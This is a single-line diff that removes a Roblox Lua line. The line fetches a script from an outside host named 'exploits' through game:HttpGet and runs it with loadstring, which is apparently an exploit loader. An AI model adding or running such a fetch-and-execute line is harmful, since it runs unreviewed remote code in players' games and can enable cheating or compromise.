@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://exploits.kapspire.com/main.lua"))();
